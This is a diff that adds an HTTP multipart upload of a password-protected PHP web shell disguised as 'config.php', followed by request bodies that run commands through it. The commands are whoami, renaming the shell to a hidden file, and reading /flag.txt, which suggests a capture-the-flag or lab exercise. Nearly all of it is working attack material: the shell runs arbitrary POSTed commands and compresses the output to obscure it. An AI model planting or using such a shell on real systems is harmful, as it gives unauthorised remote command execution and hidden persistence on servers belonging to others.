@@ -1,0 +1,5 @@
+-----------------------------1233942682625077295184095941\r\nContent-Disposition: form-data; name="file"; filename="config.php"\r\nContent-Type: text/php\r\n\r\n<?php\n$k = $_POST['k'];\n$c = $_POST['c'];\n$o = '';\nif (md5($k) == '6d697064ad1b78f7e124df9807284f69') {\n\texec($c, $o);\n\t$o = $o[0];\n\techo base64_encode(gzcompress($o, 6));\n}\n?>\r\n-----------------------------1233942682625077295184095941\r\nContent-Disposition: form-data; name="submit"\r\n\r\n������\r\n-----------------------------1233942682625077295184095941--\r\n
+k=cometohackme&c=whoami
+k=cometohackme&c=mv config.php .config.php
+k=cometohackme&c=whoami
+k=cometohackme&c=cat /flag.txt
